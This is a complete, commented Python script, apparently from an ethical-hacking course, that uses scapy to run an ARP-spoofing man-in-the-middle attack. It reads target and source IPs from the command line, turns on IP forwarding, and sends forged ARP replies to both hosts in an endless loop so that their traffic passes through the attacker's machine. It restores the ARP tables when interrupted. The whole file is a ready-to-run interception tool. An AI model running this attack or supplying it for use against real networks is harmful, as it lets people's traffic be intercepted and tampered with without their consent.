#!/usr/bin/env python

import scapy.all as scapy # handle tasks like scanning and network discovery
import time               # use sleep() for delays
import argparse           # get values as arguments


# function that handles the user arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP.")
    parser.add_argument("-s", "--source", dest="source", help="Source IP.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target, use --help for more info.")
    elif not options.source:
        parser.error("[-] Please specify a source, use --help for more info.")
    return options

# function that returns MAC address of selected IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # ARP object creation, asks who has target IP
    broadcast   = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = broadcast/arp_request # Combine into a single packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    try:
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[!] No response..")

# function that creates a man in the middle
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # op=2: send packet as response, not request
    # pdst: destination target IP address
    # hwdst: destination target MAC address
    # psrc: source IP address, here equal to router
    # hwsrc: source MAC address
    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False) # count: number of times to send


sent_packets_count = 0
options = get_arguments()
target  = options.target
source  = options.source
try:
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write("1")  # enable ip forwarding to allow flow of packets through machine
    while True:
        spoof(target, source)
        spoof(source, target)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="") # dynamic print
        time.sleep(2) # 2 seconds delay
except KeyboardInterrupt:
    print("\n[!] Detected CTRL + C ... Resetting ARP Tables...")
    restore(target, source)
    restore(source, target)
    print("[+] Done!")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write("0")  # disable ip forwarding
